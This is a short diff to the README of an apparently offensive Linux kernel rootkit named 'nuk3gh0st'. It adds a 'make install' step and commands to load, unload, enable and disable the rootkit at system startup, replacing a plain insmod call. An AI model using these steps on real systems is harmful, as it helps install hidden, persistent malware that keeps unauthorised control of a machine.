@@ -57,6 +57,7 @@ apt-get install build-essential
 
 ```sh
 make
+make install
 ```
 
 ## Use
@@ -64,7 +65,25 @@ make
 Load rootkit:
 
 ```sh
-insmod rootkit.ko
+load-nuk3gh0st
+```
+
+Unload rootkit:
+
+```sh
+unload-nuk3gh0st
+```
+
+Enabling rootkit at system startup:
+
+```sh
+startup-nuk3gh0st
+```
+
+Disabling rootkit at system startup:
+
+```sh
+rmstartup-nuk3gh0st
 ```
 
 Use rootkit:
